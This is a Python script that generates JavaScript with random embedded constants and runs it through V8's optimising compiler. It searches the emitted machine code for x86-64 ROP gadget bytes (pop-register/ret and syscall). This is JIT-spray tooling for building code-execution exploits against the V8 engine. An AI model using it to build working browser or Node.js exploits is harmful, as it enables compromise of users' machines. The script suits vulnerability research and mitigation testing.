import os
import re
import sys
import pathlib
import random
import time


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
exec_path = ''

def excute_js(js:str)->bool:
    f = open('test.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --always-opt --print-opt-code test.js | grep rip > test.txt')
    f = open('test.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('rip') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    print(words)
                    gadgets.remove(jsc)
                    os.system('cp test.js ' + jsc + '.js')
    
    os.system('python3 ana.py')
    return True

def generate_js(count:int):
    header = \
    '''
const constant = 0x1234;
function payload3(v1, v2) {
	var g10 = v1 * 0x1111;
	var g11 = v1 * 0x2222;
	var g12 = v1 * 0x3333;
	var g13 = v1 * 0x4444;
	var g14 = v1 * 0x5555;
	var g15 = v1 * 0x6666;
	var g1;
    v1 ^= 0x12345678;
	if (v1 > 0){
		g1 = 0x00;
'''

    ops = ['&', '*']
    middle = ''
    for i in range(count):
        middle += '        g15 ' +  ops[i % len(ops)] + '= ' + hex(random.randint(0xa0000000, 0xffffffff)) + ';\n'

    tail = \
'''
	}
	else{
		g1 = 0x01;
	}
	var g16 = v1 * 0x7777;
	var g2;
	if (v1 > 0)
		g2 = 0x00;
	else
		g2 = 0x01;
	var g17 = v1 * 0x8888;
	var g18 = v1 * 0x9999;
	var g19 = v1 * 0x1212;
	var g20 = v1 * 0x2323;
	var g21 = v1 * 0x3434;
	return g1 ^ g2 ^ g10 ^ g11 ^ g12 ^ g13 ^ g14 ^ g15 ^ g16 ^ g17 ^ g18 ^ g19 ^ g20 ^ g21;
}


for (var i = 0; i < 0x1; i++) {
	payload3(i, i % 32);
}
'''
    return header + middle + tail;

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()


    # for i in range(24):
    #     generate_js(i)
    # print('done')
    for i in range(4100, 4200):
        print(i)
        js = generate_js(i)
        excute_js(js)
    # time.sleep(1)
    # print(js)
    # excute_js(js)